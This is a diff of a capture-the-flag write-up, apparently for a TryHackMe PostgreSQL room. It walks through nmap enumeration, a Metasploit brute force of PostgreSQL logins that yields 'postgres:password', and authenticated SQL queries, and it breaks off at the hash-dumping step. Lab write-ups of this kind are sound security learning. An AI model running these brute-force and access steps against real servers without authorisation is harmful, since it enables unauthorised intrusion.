@@ -82,87 +82,137 @@ Escalate privileges and obtain root.txt
 
 Answer format: ***{********_***_****_***_****_****_***********}
 
+---
+## Initial Enumeration
 
-## Initial Enemurtaion
+I started with a basic Nmap scan to identify the exposed services running on the target machine.
 
-Let start with nmap scan to identify the running service
-
-```
+```bash
 ~$ nmap -sV 10.49.190.166
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-20 20:36 IST
-Nmap scan report for 10.49.190.166
-Host is up (0.025s latency).
-Not shown: 997 closed tcp ports (conn-refused)
+
 PORT     STATE SERVICE    VERSION
 22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
 80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
 5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-there are only one services is running
-* SSh is running on port `22`
-* http on port `80`
-* `postgresql` on port `5432`
 
-## Finding Vulneribality
+The scan revealed three open ports:
 
-So let use metasploit auxiliary to scan this rdbms for some vulnerability
->  msfconsole -q
-> search auxiliary postgresql
+* SSH running on port `22`
+* HTTP running on port `80`
+* PostgreSQL running on port `5432`
 
-we can see the listed auxilaryers here 
+At this stage, the PostgreSQL service immediately stood out since the room description hinted toward an RDBMS setup.
+
+---
+
+# Finding Vulnerability
+
+To interact with the PostgreSQL service, I moved into Metasploit and started looking for available PostgreSQL auxiliary modules.
+
+```bash
+msfconsole -q
+```
+
+After launching Metasploit, I searched for PostgreSQL-related auxiliary modules.
+
+```bash
+search auxiliary postgresql
+```
+
+The results displayed several PostgreSQL modules available inside Metasploit.
+
+One module that immediately caught my attention was:
+
+```bash
+auxiliary/scanner/postgres/postgres_login
+```
+
+This module is used to brute force PostgreSQL credentials using common usernames and passwords.
+
+I selected the module using:
+
+```bash
+use 4
+```
 
 <img width="1741" height="437" alt="image" src="https://github.com/user-attachments/assets/5bee1383-47a1-4d8d-a125-dbacfa8b56ff" />
 
-LEt use number 4 auxiliary/scanner/postgres/postgres_login that says `PostgreSQL Login Utility` basically this try to bruteforce the postgre
+Before running it, I checked the required configuration.
 
-Let use this to use this:
-> use 4
+```bash
+show config
+```
 
-let see what are the configs 
-> show config
-as it says we only need to mention our rhost ip
-> set RHOSTS <ip>
+The only mandatory value that needed to be configured was the target IP address.
+
+```bash
+set RHOSTS <IP>
+```
 
 <img width="1887" height="914" alt="image" src="https://github.com/user-attachments/assets/22562c38-3087-45ec-8900-6bb2fb75af59" />
 
-Let run this using cmd
-> run
+
+With the configuration completed, I executed the module.
+
+```bash
+run
+```
 
 <img width="1381" height="655" alt="image" src="https://github.com/user-attachments/assets/0e2aff5c-181e-4006-9a5c-e7b7811328b2" />
 
-We got the creds `postgres:password`
+The scan successfully discovered valid PostgreSQL credentials:
 
-Now we have to find the module that allows us to execute commands with the proper user credentials.
+```bash
+postgres:password
+```
 
-Let search for auxilary again
-to back use:
+Now that I had working credentials, the next step was to find a module that would allow authenticated interaction with the PostgreSQL server.
 
-> back
-Let search
-> search auxilary postgresql
+I returned back and searched for PostgreSQL auxiliary modules again.
+
+```bash
+back
+search auxiliary postgresql
+```
 
 <img width="1744" height="500" alt="image" src="https://github.com/user-attachments/assets/fbcd69ee-c7d5-42ee-9b4b-fc919c0e2981" />
 
-we can use this one auxiliary/admin/postgres/postgres_sql as it said `PostgreSQL Server Generic Query`
+This time, I selected:
 
-So we have to set rhost and password to set we can do
-> use 6
-> show options
-> set RHOSTS <IP>
-> set Password password
+```bash
+auxiliary/admin/postgres/postgres_sql
+```
+
+The module allows execution of SQL queries against the PostgreSQL server using valid credentials.
+
+I configured the module with the discovered password and target IP.
+
+```bash
+use 6
+show options
+set RHOSTS <IP>
+set PASSWORD password
+```
 
 <img width="1428" height="822" alt="image" src="https://github.com/user-attachments/assets/2da4da05-d8cf-42c7-9ab3-fcae33fc3780" />
 
-> run
+
+After setting the required options, I ran the module.
+
+```bash
+run
+```
 
 <img width="1185" height="252" alt="image" src="https://github.com/user-attachments/assets/fd1aa141-ca4a-4ade-8b01-16299fb9f422" />
 
-Authenticated PostgreSQL access confirmed; server version enumerated successfully.
+The authentication succeeded, confirming valid access to the PostgreSQL database server.
 
-```
+```bash
 PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
 ```
+
+
 Now the next step is dumping user hashes
 back again 
 > back
